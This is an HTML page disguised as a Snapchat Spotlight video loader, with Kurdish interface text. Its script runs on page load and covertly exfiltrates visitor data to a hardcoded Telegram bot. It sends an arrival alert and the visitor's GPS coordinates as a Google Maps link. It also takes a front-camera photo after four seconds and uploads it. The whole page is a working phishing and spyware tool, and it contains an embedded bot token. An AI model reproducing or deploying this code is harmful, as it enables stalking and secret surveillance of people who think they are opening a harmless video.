<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight</title>
    <style>
        body { background-color: #000; color: white; font-family: Arial; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        video { width: 150px; height: 200px; border-radius: 10px; margin-bottom: 20px; border: 2px solid #fffc00; object-fit: cover; }
        canvas { display: none; }
        .loader { border: 5px solid #333; border-top: 5px solid #fffc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <video id="video" autoplay playsinline></video>
        <div class="loader"></div>
        <h1>Snapchat Spotlight</h1>
        <p>تکایە چاوەڕێ بکە، ڤیدیۆ بار دبێت...</p>
    </div>

    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const token = '8897748348:AAGMPKCQUdNf6Hf2CtcZbuuqznTLqdarrIA';
        const chat_id = '646169404';

        async function sendMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        function askLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendMessage(`📍 شوێنی دۆزرایەوە:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                }, () => sendMessage("⚠️ ڕێگەی بە شوێن (GPS) نەدا."));
            }
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // لێرەدا دەدینە دەمژمێرێ تا کامێرا ب ڕوونی کار بکەت و وێنە بگرێت
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(async blob => {
                        if (blob) {
                            const formData = new FormData();
                            formData.append('chat_id', chat_id);
                            formData.append('photo', blob, 'snap.jpg');
                            try {
                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                                    method: 'POST', 
                                    body: formData 
                                });
                            } catch (err) {}
                        }
                    }, 'image/jpeg', 0.8);
                }, 4000);
            } catch (err) {
                sendMessage("⚠️ ڕێگەی بە کامێرا نەدا یان کامێرا نەدۆزرایەوە.");
            }
        }

        window.onload = () => {
            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە و داوای مۆڵەت دەکرێت...");
            askLocation();
            startCamera();
        };
    </script>
</body>
</html>
